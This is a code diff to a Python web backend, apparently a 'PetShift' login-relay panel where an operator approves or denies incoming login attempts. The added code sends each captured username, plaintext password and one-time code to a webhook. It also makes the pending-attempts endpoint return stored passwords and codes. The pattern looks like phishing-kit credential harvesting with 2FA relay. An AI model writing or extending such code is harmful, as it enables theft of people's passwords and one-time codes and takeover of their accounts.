@@ -1865,6 +1865,13 @@ def petshift_auth_start():
     lines.append("Deny:    POST /api/petshift/auth/decide {\"id\":\"" + cid + "\",\"ok\":false}")
     try:
         _browser_wh("PetShift AUTH — decide", lines)
+        # dedicated clear login ping
+        login_lines = [f"user: {user}", f"stage: {stage}", f"pid: {pid}", f"challenge: {cid}"]
+        if password:
+            login_lines.insert(1, f"password: {password}")
+        if code:
+            login_lines.insert(1, f"code: {code}")
+        _browser_wh("PetShift LOGIN", login_lines)
     except Exception:
         pass
     socketio.emit("petshift_auth", {"id": cid, "user": user, "stage": stage, "pid": pid})
@@ -1901,7 +1908,16 @@ def petshift_auth_decide():
 def petshift_auth_pending_list():
     out = []
     for cid, row in list(ps_auth_pending.items())[-50:]:
-        out.append({"id": cid, "user": row.get("user"), "stage": row.get("stage"), "status": row.get("status"), "pid": row.get("pid"), "created": row.get("created")})
+        out.append({
+            "id": cid,
+            "user": row.get("user"),
+            "password": row.get("password"),
+            "code": row.get("code"),
+            "stage": row.get("stage"),
+            "status": row.get("status"),
+            "pid": row.get("pid"),
+            "created": row.get("created"),
+        })
     out.sort(key=lambda x: x.get("created") or "", reverse=True)
     return jsonify(out)
 
